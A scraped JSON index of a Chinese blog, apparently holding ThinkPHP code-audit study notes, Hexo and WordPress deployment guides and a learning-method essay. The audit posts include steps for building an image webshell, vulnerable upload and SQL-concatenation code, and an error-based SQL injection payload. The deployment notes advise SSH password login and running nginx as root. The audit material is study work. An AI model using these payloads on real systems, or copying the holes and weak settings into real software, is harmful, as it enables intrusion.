=&gt; 2];$name = [&#x27;b&#x27; =&gt; 3, &#x27;c&#x27; =&gt; 4];//执行 array_merge 操作// 结果：$this-&gt;data = [&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 3, &#x27;c&#x27; =&gt; 4]; 将 $value 赋值给 $this-&gt;data 中对应的键 $name。 123$name = &#x27;d&#x27;;$value = 5;// 结果：$this-&gt;data[&#x27;d&#x27;] = 5; 0X06 POC 构造0X07 漏洞复现在public文件夹下，放进去一个图片马（模拟文件上传）访问/public/?cacheFile=xxxx.xxx 可触发漏洞。文件包含漏洞，上传的文件，不论什么后缀，都会被解析。（解析为php文件） 图片马的制作： 用010 editor，直接在文件后面加入php代码即可。然后保存为图片格式。 0X08 修复方案0X09 参考文章PHP 变量覆盖漏洞 - 1ndex- - 博客园 (cnblogs.com)","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"Blog静态部署","slug":"Blog静态部署","date":"2024-08-07T03:28:04.000Z","updated":"2024-10-17T08:38:57.000Z","comments":true,"path":"2024/08/07/Blog静态部署/","permalink":"https://gryffinbit.top/2024/08/07/Blog%E9%9D%99%E6%80%81%E9%83%A8%E7%BD%B2/","excerpt":"","text":"升级改造思路： 为解决静态配置转移设备的问题 把hexo部署到VPS上，实现“随时编辑，随时推送，好迁移” 然后再优化一下评论系统，看看能不能不注册就评论什么的 把我喜欢的wordpress主题，改到hexo上面去。纯手撸一些新样式。 增加那个我一直很喜欢的说说页面的功能 CDN用cloudfare，增加一些防护性 、 当前的部署方式，github上，本地推送，腾讯云域名。cloudflare的DNS 和 https 证书 github pages使用cloudflare加速自定义域名概要 - 彼时今日 - 博客园 (cnblogs.com) 0x01 系统配置腾讯云服务器，CentOS系统 整体布置思路： 为了能够在不同设备上都能进行文章的管理和推送，我将Hexo博客系统搭载在腾讯云服务器上。域名是腾讯云买的，所以需要进行备案。CDN是cloudfare提供的服务，这样可以进行一些防护，并且能够隐藏真实的公网IP。域名解析也是cloudfare。 整个blog回归静态博客，最重要的原因是我喜欢专注于文章内容，简洁。其次是出于安全性的考虑。 把hexo的目录，当成nginx的工作目录就好了。在xftp里面，直接放新写的markdown文件进去就好。（vscode ssh远程连接也是个好办法） 一点腾讯云小坑 防火墙打开21、22端口 ssh认证方式改为允许密码认证。passedAuthentication=YES 安装hexo1sudo npm install hexo-cli -g 为了让后续初始化 Hexo 命令成功执行，你需要为你的 Hexo 创建一个新文件夹，文件夹名字按喜好自选。 12#创建文件夹mkdir 你的文件夹名 使用 cd 文件夹名 进入刚刚创建的 Hexo 文件夹，并初始化 Hexo，让系统在这个文件夹内创建 Hexo 运行所需要的模板文件。 12#初始化 Hexohexo init 其中，_config.yml、source/、themes/ 这个三个文件 &#x2F; 文件夹值得你多注意。其中 _config.yml 是博客的基本配置文件，你可以在这个文件里修改博客的基本信息，比如博客名、博客作者、博客网址；博客中的文章等用户资源都存放文件夹 source/ 中；文件夹 themes/ 是存放博客主题文件的文件夹，如果你要修改主题，你就需要把所下载的主题文件放在这里。 现在模板文件已经创建完成，你可以通过 hexo g 命令让 Hexo 根据模板文件生成静态网页了。系统会在 Hexo 文件夹内新创建一个 public/ 文件夹，你可以在这个文件夹内看到生成的静态网页相关文件。 如果你想立马预览网页，使用 hexo s 启动 Hexo 服务端，在浏览器打开 服务器IP:4000 预览网页，不过此步骤需要你提前打开服务器 4000 端口，并保证 4000 端口没有被其他服务占用。 1234#生成静态网页hexo g#启动 Hexo 服务端hexo s Nginx 安装配置12345yum install – y epel-releaseyum install nginxsystemctl start nginxsystemctl enable nginxvim /etc/nginx/nginx.conf 把 root 这一行改成hexo的 public/ 文件夹目录，注意最后不要加斜杠；在 server_name 填上你的域名 1service nginx restart 打开浏览器，输入你的域名，你就可以看到 Hexo 初始网页了。 有一个小坑，nginx conf的默认user是nginx。这样去访问的时候会出现403的报错。（也有可能因为文件权限的问题，文件在root下，所以可能会报404的错。）所以需要将nginx配置文件那行修改为root。 1vim /etc/nginx/nginx.conf 1service nginx restart 0x02 Hexo 主题配置 主题美化比较复杂，可以在本地搭建一个hexo服务，一边修改一边实时预览，比较稳妥。 也可以直接vscode远程连接到服务器上，直接修改。集成xftp、xshell、sublime一体 Volantis主题Volantis: 主题配置 - Volantis 0x03 静态 hexo 说说功能Lete114&#x2F;hexo-artitalk-static: Artitalk 静态版，本地编写说说(就像写文章一样)，需要 hexo g 生成 (github.com) 添加ejs 样式（自定义） 1/root/Blog/themes/volantis/layout/artitalk.ejs 123456&lt;%- partial(&#x27;_pre&#x27;) %&gt;&lt;div class=&#x27;l_main&lt;%- page.sidebar == false ? &#x27; no_sidebar&#x27; : &#x27;&#x27; %&gt;&#x27;&gt; &lt;%- partial(&#x27;_partial/article&#x27;, &#123;post: page, index: false&#125;) %&gt;&lt;/div&gt;&lt;%- partial(&#x27;_partial/side&#x27;) %&gt; 安装 1npm install hexo-artitalk-static 创建说说文件 在你的博客根目录的 source/_data 创建文件 artitalk.yml。 以后你的所有说说都会写在这里面 123456## 说说格式- content: Hexo-Artitalk-Static 真不错，没有后端，没有请求，速度是真的快- content: | 如果你的 JavaScript 基础还不错 你还可以为 Hexo-Artitalk-Static 写自定义插件，还可以自定义说说的模板 自由度是真的高(也可以安装别人的插件) 以上方式不会自动实时生成说说的时间，只有在执行了 hexo s 或 hexo g 的时候才会自动生成说说的时间 (而且是当前执行这个命令的时间，并不是你写说说的时间) 你可以在写说说前执行 hexo s 命令，然后再打开 source/_data/artitalk.yml 编写新说说，这样它才会实时生成说说的时间 创建新文件 1/root/Blog/source/artitalk/index.md 配置信息 1/root/Blog/themes/volantis/_config.yml 修改导航栏的ui显示 1/root/Blog/themes/volantis/_config.yml 待开发 0x04 增加说说页码功能和归档功能改造Argon主题之为说说页面添加页码 – 哈冬猪的小站 (hadongzhu.com) 0x05 CSS 美化WordPress 子主题能干什么以及不能干什么 - 鸦鸦的巢穴 (crowya.com) hexo之Volantis主题美化-CSDN博客 Argon 主题修改记录 - 鸦鸦的巢穴 (crowya.com) fushulingのblog – 狗and猫的安全笔记 0x06 live2DLive2D 宠物功能修改|音乐播放器+右键秘密通道 - 鸦鸦的巢穴 (crowya.com) 养一只博客宠物 - 鸦鸦的巢穴 (crowya.com) 0x07 SEO（搜索引擎优化）","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://gryffinbit.top/tags/hexo/"}],"author":"Gryffinbit"},{"title":"Blog 动态部署","slug":"Blog-动态部署","date":"2024-08-07T03:27:48.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2024/08/07/Blog-动态部署/","permalink":"https://gryffinbit.top/2024/08/07/Blog-%E5%8A%A8%E6%80%81%E9%83%A8%E7%BD%B2/","excerpt":"","text":"0X01 服务器域名准备配置：腾讯云服务器 SSL证书、CDN：cloudfare 博客系统：wordpress 0X02 主题美化argon 主题 首页打字机效果修改style.css 12345678910111213141516171819202122232425.banner-title &#123; font-size: 2.2em; width: auto; height: auto; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); border-right: 2px solid black; animation: typing 4.5s steps(40, end) forwards, blink-caret 0.75s step-end infinite; overflow: hidden; white-space: nowrap; /* Ensure the text does not wrap */ text-align: center; /* Center the text */&#125;@keyframes typing &#123; from &#123; width: 0; &#125; to &#123; width: 50%; &#125;&#125;@keyframes blink-caret &#123; from , to &#123; border-color: beige; &#125; 30% &#123; border-color: transparent; &#125;&#125; 首页进入全屏效果并增加箭头在设置中修改为全屏 修改样式 style.css 12345678910111213141516171819202122232425262728293031/*========Banner动态箭头===========*/@keyframes up-down-move &#123; 0% &#123; opacity:0; transform:translate(-50%,-150px); &#125; 50% &#123; opacity:1; transform:translate(-50%,-130px); &#125; 100% &#123; opacity:0; transform:translate(-50%,-110px); &#125;&#125;.cover-scroll-down .fa-angle-down&#123; font-size: 3rem; text-shadow: 0px 0px 8px #dc1111; position:absolute; transform: translate(-50%,-80px); opacity:0;&#125;.cover-scroll-down #pointer1&#123; animation: up-down-move 3s linear infinite;&#125;.cover-scroll-down #pointer2&#123; animation: up-down-move 3s 1s linear infinite;&#125;.cover-scroll-down #pointer3&#123; animation: up-down-move 3s 2s linear infinite;&#125; 修改header.php，在437行 1234567&lt;?php if ($banner_size == &#x27;fullscreen&#x27;) &#123; ?&gt; &lt;div class=&quot;cover-scroll-down&quot;&gt; &lt;i class=&quot;fa fa-angle-down&quot; aria-hidden=&quot;true&quot; id=&quot;pointer1&quot;&gt;&lt;/i&gt; &lt;i class=&quot;fa fa-angle-down&quot; aria-hidden=&quot;true&quot; id=&quot;pointer2&quot;&gt;&lt;/i&gt; &lt;i class=&quot;fa fa-angle-down&quot; aria-hidden=&quot;true&quot; id=&quot;pointer3&quot;&gt;&lt;/i&gt; &lt;/div&gt;&lt;?php &#125; ?&gt; 彩虹字style.css 12345678910111213141516171819202122232425262728293031.banner-title::before &#123; content: &#x27;&#x27;; position: absolute; top: 0; left: 50%; bottom: 0; right: 0; transform:translatex(-50%); max-width:500px; z-index: -100; background:transparent; filter: blur(30px); opacity: 0.8;&#125;.banner-title .banner-title-inner&#123; position:relative; background:inherit;&#125;.banner-title .banner-subtitle&#123; position:relative; background:inherit;&#125;.banner-title &#123; position: absolute; background: linear-gradient(90deg, #03a9f4, #f441a5, #ffeb3b, #03a9f4); background-size:200%; animation: ColdLight 3s linear infinite; color:transparent !important; -webkit-background-clip: text;&#125; 全站自定义字体全定制化设置字体，区分中英文的字体，区分不同位置的字体，包括正文、导航栏、标题。 修改style.css，增加以下代码 可以在这个网站去找字体的资源 Selection Embed Code - Google Fonts 只修改特定的部分，比如banner、body、等自定义。（可以搜font，全局的修改特定的字体和特定位置的字体） 12345678.banner-title &#123; font-family: &#x27;Press Start 2P&#x27;; src: url(&#x27;https://fonts.googleapis.com/css2?family=Press+Start+2P&amp;display=swap&#x27;); font-weight: normal; font-style: normal; font-display: swap;&#125; 也可以在style.css前面的位置全局声明加载资源 强制修改为固定的文字内容和字体，修改header.php和style.css创造新的类 Argon 主题选项在Argon主题选项页面进行编辑，修改banner、菜单等 动态部署了一半，然后觉得还是静态优雅，这篇文章就写到这儿吧。我要把博客换回静态了，再升级改造一下。告辞！去写另外一篇blog部署文章咯！ wordpress修改版 链接: https://pan.baidu.com/s/1T2mD_V3JQnpaV9VC8lI2Ug?pwd=numu 提取码: numu 复制这段内容后打开百度网盘手机App，操作更方便哦–来自百度网盘超级会员v7的分享","categories":[{"name":"创意开发","slug":"创意开发","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"wordpress","slug":"wordpress","permalink":"https://gryffinbit.top/tags/wordpress/"}],"author":"Gryffinbit"},{"title":"学习路线","slug":"学习路线","date":"2024-08-07T03:26:51.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/07/学习路线/","permalink":"https://gryffinbit.top/2024/08/07/%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/","excerpt":"","text":"我在自己学习的过程中，非常迷茫的一点是，我能找到很多现成的文章，找到很多的鱼。但是我找不到思考过程的那个渔。我感觉自己技术最大的困难是，我特别想知道别人都是“怎么想到的”。我感觉自己是个很抽象的人，我在做一件事情的时候，总想抽象出来一个可以被复用的框架。 比如，同样是学习新知识，有的人就能很快地抓住重点，学会，上手。有的人却很慢，找不到方向。有人说，方法很重要，要找对方法。但是后来又衍生出很多的“方法”，于是就变成了，有人能找到对的方法，有人找不到对的方法。最后变成了死记硬背，连“技巧”都是在生硬套用，不能融会贯通。所以我就想要思考一套“行为模型”，一套“思考方式”，把一些好的东西“抽象出来“。 所以我的blog，我想成为一个”抽象派大师“，授人以渔。在每一篇深入分析或学习记录的文章中，记录下我思考的过程，我的心路，我的探索过程。把我的”行为模型”和“思考方式”，呈现出来。这样就可以帮助其他像我一样的抽象派，让他们可以把我抽象出来的框架，套用在自己身上，直接就可以运行了。 现在我正在探索适合自己的学习模式，并且在试运行中，之后会渐渐优化，不断地更新加强自己。 Gryffinbit 学习框架 1.0 ： 准则：整个思考模式是套娃，无限循环无限细化 先把框架定出来，然后再有方向性的填内容进去 明确我要干什么 在网上搜索该知识点下有哪些零碎的方向，地毯式搜索，检索大量零碎的信息 把这些零碎的东西，都先过一遍，浅浅的在脑中留下印象 举个例子： 我要学习代码审计，了解了有不同的语言，我决定先从php开始学起。然后我了解到php有很多框架，而thinkphp是其中很基础很简单的框架，于是我从该框架入手。【这一步明确了我要干什么。是我的初步框架。在定下这个框架的过程中，我检索了大量零碎的信息，搜了有哪些语言，哪些php框架】明确了该框架，我又开始了地毯式信息搜索，检索该框架的各种技术文章，我决定从文档看起&#x2F;我决定跟进某个技术文章的分析。此时我又处于了大量零碎信息的迷茫时段。直到我弄明白了，框架包括路由机制、控制器、模型、视图、中间件等。于是，我又明确了要干什么。这样一步一步循环向前。 完成知识吸收的闭环 学习很多东西时，因为没有明确的地图路线，有些路走了，有些知识学了，但一知半解。这个时候要继续学下去，然后到某个点，发现理解了前面的东西，或者是发现欠缺了哪部分的知识，这时候再返回去看。 学习某个知识点的时候，需要一个明确的意义和目的 明确意义是给自己学习一个方向，并加深理解。 正向的：先思考意义，后学习知识。我在学习一个框架，我很迷茫，东西太多了，不知道怎么下手。我去问chat “框架我要怎么学习呢，学习到哪个方面和程度时就足以应对代码审计找出安全漏洞了呢”。然后它告诉我要学习框架基础（路由机制、控制器、模型、视图、中间件等）、进行开发训练等。然后这些就变成了我学习方向了。 逆向的：先学习知识，后悟出意义。有的时候随着学习的深入，就忽然理解一些东西存在的意义了。比如技术文章里说，从程序入口开始看起。但我不明白为什么，我就认为为什么不从路由看起。后来我知道了，哦，因为路由可以是多路由，程序入口追踪下去才能确定走什么方式的路由。 一些新思路的启发： 🐹:貌似把每个原理都搞清楚，脑子里的原理链条多了，看到问题潜意识就能想出来咋搞了。脑子变成海就有渔了 🐰:但这是个悖论。你得先学会一个东西，才能养成这样的意识 🐹:不影响呀，先笨着学一条证据链。懂多了就有意识了，就能聪明的学了 🐰:先盲目的跟下去，然后再慢慢找路径是吧 🐹:也不太是这种意思 🐰:那就是单纯的扩充知识面？ 🐹:我是一层层的找为什么，找到底，直到搜不到了。我这种应该是先破点（好像？不确定 🐰:是比较发散性的那种嘛？先上手，遇到什么不懂得，就去搜去学，循环往复 🐹:一个底就是一条道。3000大道集齐，就触类旁通了。就是比如你不知道他为什么能想到这个点子。你就去把这个点子知识背后涉及的原理过程全部搞明白。遇到其他的问题，有可能那个问题的底层原理相似，这时候你已经搞定过一条道了，就有助于后面遇到的这个问题的潜意识理解 🐰:哦哦，好像明白你的意思了，一个点子，就i是一个结果。你想要自己得出这个结果，就需要把这个过程学会。攒多了这样的过程，自己就能得出很多这样的结果了 🐹:嗯嗯，我也不知道这样对不对。反正我现在无论看到什么文章知识都不会觉得离谱了，潜意识都觉得在意料之中 除非是特别离谱的（比如普京跳钢管舞","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"思路","slug":"思路","permalink":"https://gryffinbit.top/tags/%E6%80%9D%E8%B7%AF/"}],"author":"Gryffinbit"},{"title":"thinkphp5.1 框架学习","slug":"thinkphp5-1-框架学习","date":"2024-07-07T08:01:43.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/07/07/thinkphp5-1-框架学习/","permalink":"https://gryffinbit.top/2024/07/07/thinkphp5-1-%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"0x00 PHP函数 记录一下学习的过程，只挑了一些自己不懂的和很重要的地方，零散的拿出来详细的写写 基于ThinkPHP的代码审计——Niushop (qq.com) php 内置函数，新建文件并编辑权限 1234if (! file_exists($this-&gt;reset_file_path)) &#123; $mode = intval(&#x27;0777&#x27;, 8); // 八进制，777权限 mkdir($this-&gt;reset_file_path, $mode, true);&#125; 文件上传检测不严谨 只规定了上传的格式，没有规定后缀 1234567891011121314private function validationFile()&#123; $flag = true; switch ($this-&gt;file_path) &#123; case UPLOAD_AVATOR: // 用户头像 if (($this-&gt;file_type != &quot;image/gif&quot; &amp;&amp; $this-&gt;file_type != &quot;image/png&quot; &amp;&amp; $this-&gt;file_type != &quot;image/jpeg&quot; &amp;&amp; $this-&gt;file_type != &quot;image/jpg&quot;) || $this-&gt;file_size &gt; 1000000) &#123; $this-&gt;return[&#x27;message&#x27;] = &#x27;文件上传失败,请检查您上传的文件类型,文件大小不能超过1MB&#x27;; $flag = false; &#125; break; &#125; return $flag;&#125; sql注入 12345678910111213141516171819202122232425public function promotionZone()&#123; $platform = new Platform(); $goods = new GoodsService(); // 品牌专区广告位 $brand_adv = $platform-&gt;getPlatformAdvPositionDetailByApKeyword(&quot;goodsLabel&quot;); $this-&gt;assign(&#x27;brand_adv&#x27;, $brand_adv); if (request()-&gt;isAjax()) &#123; $page_index = request()-&gt;get(&#x27;page&#x27;, &#x27;1&#x27;); $group_id = request()-&gt;get(&quot;group_id&quot;, &quot;&quot;); $this-&gt;goods = new GoodsService(); $condition = &quot;&quot;; if (! empty($group_id)) &#123; $condition = &quot;FIND_IN_SET(&quot; . $group_id . &quot;,ng.group_id_array)&quot;; &#125; else &#123; $condition[&#x27;ng.group_id_array&#x27;] = array( &#x27;neq&#x27;, &#x27;&#x27; ); &#125; $goods_list = $this-&gt;goods-&gt;getGoodsList($page_index, PAGESIZE, $condition, &quot;&quot;, $group_id); return $goods_list; &#125;&#125; 1$condition = &quot;FIND_IN_SET(&quot; . $group_id . &quot;,ng.group_id_array)&quot;; 没有对$group_id的内容进行过滤，并且可以通过get的方式对该内容进行传参，所以就存在sql注入。 当sql注入可以通过报错来获得回显的时候，可以通过sql语句extractvalue(1,concat(char(126),@@version)) 进行版本查询。 EXTRACTVALUE() 函数在MySQL中用于从XML文档片段中提取值。它通常接受两个参数：第一个是XML字符串，第二个是XPath表达式，用于定位XML中的数据。然而，在SQL注入攻击中，攻击者可能会滥用这个函数以引发错误消息，从而泄露数据库的信息。 CONCAT() 函数用于连接两个或多个字符串。在这种情况下，它被用来构建一个包含敏感数据（如数据库版本）的字符串。 0x01 LoaderLoader 类在ThinkPHP 5.1中扮演了重要的角色，通过提供简洁的API来加载应用的各种组件. Loader 类通过注册自己为自动加载函数，帮助PHP解析并找到正确的类文件。 thinkphp通过start.php引入的base.php定义文件夹等系统常量，然后引入Loader来加载任意类，通过自动加载使用Error类注册错误处理，以及Config类加载模式配置文件thinkphp/convention.php。做好一系列准备工作之后，执行应用 App::run()-&gt;send() 例如加载控制器： 控制器通常在路由调用时自动加载，但如果需要手动加载控制器，可以使用 Loader::controller 方法。 12$userController = Loader::controller(&#x27;User&#x27;, &#x27;controller\\index&#x27;);// 这会加载 app\\index\\controller\\User 控制器 0x02 hook“钩子”（Hook）允许开发者在应用程序的特定点插入自己的代码，而不需要修改主体程序。这种机制特别在插件或扩展功能开发中非常重要，因为它允许开发者扩展或修改应用程序的行为，而不直接影响主程序的稳定性和完整性。钩子本身通常不负责验证逻辑本身，而是提供一个插入自定义代码和扩展功能的点。 钩子大体可以分为两类： 动作钩子（Action Hooks）： 这种钩子允许你在程序的特定时刻执行一个动作。例如，在用户注册后发送欢迎邮件就是通过动作钩子实现的。 动作钩子通常不返回值，它们主要用于触发事件或操作。 过滤钩子（Filter Hooks）： 过滤钩子允许你修改数据。例如，WordPress中的the_content钩子允许你修改文章内容，如添加额外的HTML，或是动态修改文本。 这类钩子接收一个值作为输入，经过处理后返回新的值。 钩子的工作流程通常包括三个基本步骤： 定义钩子位置： 开发主程序的开发者在软件的关键位置放置钩子。这些位置通常是执行操作或返回数据之前的点，例如数据保存到数据库之前。 在PHP框架中，这通常通过调用预留的函数或方法来实现，如调用do_action()或apply_filters()。 附加函数（Hooking Functions）： 外部开发者或插件开发者编写自定义函数来“挂钩”到这些预定义的钩子上。这通常通过调用如add_action()或add_filter()的函数来实现，这些函数让你指定当钩子被触发时应该执行哪个函数。 执行钩子： 当到达程序中定义钩子的位置时，所有附加到该钩子的函数都会按照指定的顺序执行。这允许动态地修改程序的行为或数据。 举个例子 标准登录流程（无钩子）： 用户提交用户名和密码：用户在登录表单填写信息后提交。 系统验证凭据：系统将用户提交的信息与数据库中的数据进行比对。 处理验证结果 如果验证成功（即用户名和密码匹配），用户被认为已成功登录，系统可能会跳转到主页或用户仪表板。 如果验证失败，可能会显示一个错误消息。 引入钩子的登录流程： 在有钩子的情况下，流程可能会包含一些额外的步骤，允许自定义或扩展功能： 用户提交用户名和密码。 前置钩子：在验证用户凭据之前执行。这可以用于记录尝试登录的日志、检查账号是否被锁定等预处理操作。 系统验证凭据：与标准流程相同。 后置钩子 如果凭据正确，登录成功钩子可以触发，例如用于触发欢迎邮件的发送、记录登录成功的日志、加载用户的个性化设置等。 如果凭据不正确，登录失败钩子可以触发，例如用于记录登录失败尝试、增加账户的安全级别等。 在验证登录过程中，利用钩子执行额外的操作或检查。钩子本身通常不负责验证逻辑本身，而是提供一个插入自定义代码和扩展功能的点。 0x03 input 函数获取请求参数在ThinkPHP框架中，input 助手函数是一个非常重要的功能，它用于获取客户端传递来的数据（如GET、POST等请求数据）。这个助手函数主要用于简化和加强数据获取和验证的过程。 获取数据： 可以指定要获取的数据类型和变量名。如果不指定，默认为 input(&#39;param.&#39;)，它将从默认的请求变量中获取数据。 12$name = input(&#x27;get.name&#x27;); // 获取GET请求中的name变量$age = input(&#x27;post.age&#x27;); // 获取POST请求中的age变量 判断有没有传递某个参数可以用 12input(&#x27;?get.id&#x27;);input(&#x27;?post.name&#x27;); 数据过滤和验证： input 函数允许您指定过滤函数或者验证规则。这是通过传递第二个参数来实现的，可以是PHP的内置过滤函数，也可以是自定义的回调函数。 1$email = input(&#x27;post.email&#x27;, &#x27;&#x27;, &#x27;trim,strtolower,email&#x27;); // 使用多个过滤器 设置默认值： 如果指定的变量不存在，可以通过传递第三个参数来设置一个默认值。 1$status = input(&#x27;post.status&#x27;, 0); // 如果post中没有status变量，则默认为0 获取整个数组： 如果想获取整个GET或POST数组，可以省略变量名。 12$allGetVars = input(&#x27;get.&#x27;); // 获取所有GET变量$allPostVars = input(&#x27;post.&#x27;); // 获取所有POST变量 函数段解析thinkphp/helper.php:121 123456789101112131415161718192021222324function input($key = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)&#123; if (0 === strpos($key, &#x27;?&#x27;)) &#123; $key = substr($key, 1); $has = true; &#125; if ($pos = strpos($key, &#x27;.&#x27;)) &#123; // 指定参数来源 list($method, $key) = explode(&#x27;.&#x27;, $key, 2); if (!in_array($method, [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;patch&#x27;, &#x27;delete&#x27;, &#x27;route&#x27;, &#x27;param&#x27;, &#x27;request&#x27;, &#x27;session&#x27;, &#x27;cookie&#x27;, &#x27;server&#x27;, &#x27;env&#x27;, &#x27;path&#x27;, &#x27;file&#x27;])) &#123; $key = $method . &#x27;.&#x27; . $key; $method = &#x27;param&#x27;; &#125; &#125; else &#123; // 默认为自动判断 $method = &#x27;param&#x27;; &#125; if (isset($has)) &#123; return request()-&gt;has($key, $method, $default); &#125; else &#123; return request()-&gt;$method($key, $default, $filter); &#125;&#125; $key: 可选参数，用于指定要获取的数据的键（key），同时可以通过在键前加前缀来指定数据来源（例如 post.name 表示从 POST 数据获取 name 键的值）。如果键以 ? 开头，表示检查该键是否存在。 $default: 可选参数，如果指定的键不存在，则返回这个默认值。 $filter: 可选参数，用于指定应用于数据的过滤器。 检查键是否存在 1234if (0 === strpos($key, &#x27;?&#x27;)) &#123; $key = substr($key, 1); $has = true;&#125; 这段代码检查 $key 是否以 ? 开始。如果是，移除 ? 并设置一个标记 $has，表示后续操作应检查键是否存在而非直接获取值。 解析数据来源 123456789if ($pos = strpos($key, &#x27;.&#x27;)) &#123; list($method, $key) = explode(&#x27;.&#x27;, $key, 2); if (!in_array($method, [&#x27;get&#x27;, &#x27;post&#x27;, &#x27;put&#x27;, &#x27;patch&#x27;, &#x27;delete&#x27;, &#x27;route&#x27;, &#x27;param&#x27;, &#x27;request&#x27;, &#x27;session&#x27;, &#x27;cookie&#x27;, &#x27;server&#x27;, &#x27;env&#x27;, &#x27;path&#x27;, &#x27;file&#x27;])) &#123; $key = $method . &#x27;.&#x27; . $key; $method = &#x27;param&#x27;; &#125;&#125; else &#123; $method = &#x27;param&#x27;;&#125; 这段代码检查 $key 中是否包含点 (.)，用来分隔数据来源和实际的键名。例如 post.name。 如果存在点分隔符，explode 函数用来分离数据来源和键名。 检查分离出的来源是否在预定义的来源列表中，如果不在，则重设 $method 为 param（表示自动判断来源），并将原始的方法和键重新组合成 $key。 返回数据 12345if (isset($has)) &#123; return request()-&gt;has($key, $method, $default);&#125; else &#123; return request()-&gt;$method($key, $default, $filter);&#125; 如果设置了 $has（查询键是否存在），调用 has 方法来检查键是否存在，方法名动态从 $method 变量获取（利用 PHP 的变量函数特性）。 如果没有设置 $has，直接通过动态方法名获取键的值，传递 $key, $default, 和 $filter 作为参数。 0x04 路由机制 thinkphp 采用的是多路由方式 定义方式 定义格式 方式1：路由到模块&#x2F;控制器 ‘[模块&#x2F;控制器&#x2F;操作]?额外参数1&#x3D;值1&amp;额外参数2&#x3D;值2…’ 方式2：路由到重定向地址 ‘外部地址’（默认301重定向） 或者 [‘外部地址’,‘重定向代码’] 方式3：路由到控制器的方法 ‘@[模块&#x2F;控制器&#x2F;]操作’ 方式4：路由到类的方法 ‘\\完整的命名空间类::静态方法’ 或者 ‘\\完整的命名空间类@动态方法’ 方式5：路由到闭包函数 闭包函数定义（支持参数传入） 路由到模块&#x2F;控制器这是最常用的一种路由方式，把满足条件的路由规则路由到相关的模块、控制器和操作，然后由App类调度执行相关的操作。 在通过route/route.php 来自定义路由 路由地址 · ThinkPHP5.1完全开发手册 · 看云 (kancloud.cn) thinkphp采用的时MVC的开发模式，C代表controller，是控制器，用于进行路由的转发。index控制器在index/controller/Index.php 1Route::get(&#x27;hello/:name&#x27;, &#x27;index/hello&#x27;); 这条路由定义指明了当客户端向服务器发起一个GET请求，且URL匹配hello/:name模式时，请求将被转发到index模块的index控制器的hello方法处理。:name是一个动态参数，它会捕获URL中相应位置的值并传递给控制器方法。 URL 的访问设计：URL访问 · ThinkPHP5.1完全开发手册 · 看云 (kancloud.cn)，可以去访问hello方法 如果不支持PATHINFO的服务器可以使用兼容模式访问如下： 1http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...\\] 所以访问hello方法的时候，构造路由http://thinkphp5:8090/public/index.php?s=index/index/hello/name 可以传参进去 还可以支持路由到动态的模块、控制器或者操作，例如： 1234// action变量的值作为操作方法传入Route::get(&#x27;:action/blog/:id&#x27;, &#x27;index/blog/:action&#x27;);// 变量传入index模块的控制器和操作方法Route::get(&#x27;:c/:a&#x27;, &#x27;index/:c/:a&#x27;); 路由到重定向地址旧的页面URL，如 /old-page，想要将所有访问这个旧页面的请求重定向到新页面 /new-page，下面是如何设置路由规则的例子： 1234567use think\\Route;// 使用redirect方法进行重定向Route::get(&#x27;old-page&#x27;, &#x27;redirect:/new-page&#x27;);// 或者使用完整URL进行重定向Route::get(&#x27;old-blog&#x27;, &#x27;redirect:http://example.com/new-blog&#x27;); 这些路由规则意味着： 访问 /old-page 时，用户会被自动重定向到 /new-page。 访问 /old-blog 时，用户会被自动重定向到 http://example.com/new-blog。 动态传递的路由参数 12// 动态重定向Route::get(&#x27;user/:id&#x27;, &#x27;redirect:/new-user/:id&#x27;); 在这个例子中，任何形如 /user/123 的URL将会被重定向到 /new-user/123，其中 :id 是动态传递的。 redirect方法 V5.1.3+版本开始，可以直接使用redirect方法注册一个重定向路由 1Route::redirect(&#x27;blog/:id&#x27;,&#x27;http://blog.thinkphp.cn/read/:id&#x27;,302); 0x05 控制器控制器定义 · ThinkPHP5.1完全开发手册 · 看云 (kancloud.cn) 搞清楚功能所在文件的绝对路径与访问URL之间的关系 控制器类 123456789101112&lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends Controller&#123; public function index() &#123; return &#x27;index&#x27;; &#125;&#125; 控制器类文件的实际位置是 1application\\index\\controller\\Index.php 访问URL地址是（假设没有定义路由的情况下） 1http://localhost/index.php/index 在ThinkPHP中，URL访问地址通常通过路由来定义，路由决定了哪些URL可以访问哪些控制器中的方法。基于上面的Index控制器例子，如果想通过URL访问index方法，需要在路由配置文件中定义一个路由，如： 1234// 路由定义可能位于 route.php 文件中use think\\Route;Route::get(&#x27;hello&#x27;, &#x27;index/index&#x27;); // 当访问 /hello 时，调用 index 控制器的 index 方法 这意味着当用户访问http://yourdomain.com/hello时，将会触发Index控制器的index方法，并显示返回结果Hello, ThinkPHP!。 0x06 路由和控制器之间的关系如果没有明确地定义路由规则，那么URL的访问和解析会依赖于框架的默认路由规则。 ThinkPHP默认的URL格式遵循以下结构： 1http://[hostname]/[entry_script]/[module]/[controller]/[action] hostname - 服务器的地址（例如 localhost） entry_script - 入口文件（通常是 index.php） module - 应用模块名（通常是 index） 确定模块名的方法： 查看项目结构：模块名通常是application目录下的子目录名。你可以查看这个目录来确定你的应用包含哪些模块。 